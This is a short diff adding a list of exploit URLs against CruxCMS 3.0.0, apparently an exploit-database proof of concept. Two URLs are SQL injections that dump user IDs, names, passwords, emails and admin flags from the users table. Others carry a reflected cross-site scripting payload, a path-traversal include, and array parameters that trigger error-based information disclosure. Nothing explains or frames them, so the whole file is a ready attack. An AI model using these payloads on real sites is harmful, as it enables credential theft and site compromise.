@@ -1,0 +1,8 @@
+http://www.example.com/cruxcms.3.0.0/search.php?search=_&amp;max=1+UNION+ALL+SELECT+1,CONCAT_WS(0x3a,Id,Name,Password,Email,Admin),1,1+FROM+cruxcms_users
+http://www.example.com/cruxcms.3.0.0/links.php?max=1+UNION+ALL+SELECT+1,1,CONCAT_WS(0x3a,Id,Name,Password,Email,Admin),1,0x596573+FROM+cruxcms_users
+http://www.example.com/cruxcms.3.0.0/includes/template.php?style=../white.gif
+http://www.example.com/cruxcms.3.0.0/manager/login.php?message=&lt;script&gt;alert(123);&lt;/script&gt;
+http://www.example.com/cruxcms.3.0.0/manager/switcher.php?style[]
+http://www.example.com/cruxcms.3.0.0/search.php?search[]
+http://www.example.com/cruxcms.3.0.0/manager/filetypes.php
+http://www.example.com/cruxcms.3.0.0/styles/andreas01.php
